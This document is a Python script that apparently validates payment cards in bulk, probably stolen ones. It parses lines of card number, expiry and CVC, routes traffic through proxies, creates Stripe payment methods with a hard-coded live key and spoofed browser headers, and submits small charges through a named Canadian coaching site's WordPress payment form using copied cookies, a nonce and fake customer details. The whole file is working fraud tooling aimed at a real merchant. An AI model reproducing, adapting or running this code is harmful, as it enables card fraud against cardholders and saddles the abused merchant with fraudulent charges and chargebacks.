import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://js.stripe.com',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://js.stripe.com/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
}

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=7053c9b8-3bf4-4384-8d03-87ca7e82835aafda1a&sid=d34b0278-eafb-40f5-8f83-d1875cdd040a00320b&pasted_fields=number&payment_user_agent=stripe.js%2F276ab76cdc%3B+stripe-js-v3%2F276ab76cdc%3B+card-element&referrer=https%3A%2F%2Fstrategicleadercoaching.ca&time_on_page=131206&key=pk_live_51IsDv5EBVRbKqDbDAqIsZScTC3oaCiXTZlqU2HZk4wPjS4Y5MK6LDynWYd2vJgLSbULG21W0aKaxGf3CiwtonlP1001MRsqCV8'

        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        pm = r1.json()['id']


        cookies = {
    '_ga_FTBN62WQJ4': 'GS1.1.1733548688.2.0.1733548688.60.0.0',
    '_ga': 'GA1.2.2143912863.1733206832',
    '_gid': 'GA1.2.865032309.1733548689',
    '_clck': '1j1u6lt%7C2%7Cfri%7C0%7C1798',
    '_clsk': '1cvlsi5%7C1733548689703%7C1%7C1%7Cn.clarity.ms%2Fcollect',
    '_ga_SE931M95B1': 'GS1.1.1733548687.2.0.1733548693.54.0.0',
    '__stripe_mid': '7053c9b8-3bf4-4384-8d03-87ca7e82835aafda1a',
    '__stripe_sid': 'd34b0278-eafb-40f5-8f83-d1875cdd040a00320b',
    '_gcl_au': '1.1.943766966.1733206833.1378690582.1733548725.1733548817',
}

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'x-requested-with': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://strategicleadercoaching.ca',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://strategicleadercoaching.ca/one-on-one-strategic-meeting-mapper-2/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    # 'Cookie': '_ga_FTBN62WQJ4=GS1.1.1733548688.2.0.1733548688.60.0.0; _ga=GA1.2.2143912863.1733206832; _gid=GA1.2.865032309.1733548689; _clck=1j1u6lt%7C2%7Cfri%7C0%7C1798; _clsk=1cvlsi5%7C1733548689703%7C1%7C1%7Cn.clarity.ms%2Fcollect; _ga_SE931M95B1=GS1.1.1733548687.2.0.1733548693.54.0.0; __stripe_mid=7053c9b8-3bf4-4384-8d03-87ca7e82835aafda1a; __stripe_sid=d34b0278-eafb-40f5-8f83-d1875cdd040a00320b; _gcl_au=1.1.943766966.1733206833.1378690582.1733548725.1733548817',
}

        params = {
    't': '1733548820647',
}

        data = {
    'data': f'__fluent_form_embded_post_id=14399&_fluentform_85_fluentformnonce=298a2a8028&_wp_http_referer=%2Fone-on-one-strategic-meeting-mapper-2%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Thua&email=thur07656%40gmail.com&payment_input=6.00&gst_calculation=0.3&payment_method=stripe&item__85__fluent_checkme_=&__stripe_payment_method_id={pm}',
    'action': 'fluentform_submit',
    'form_id': '85',
}

        r2 = requests.post(
    'https://strategicleadercoaching.ca/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip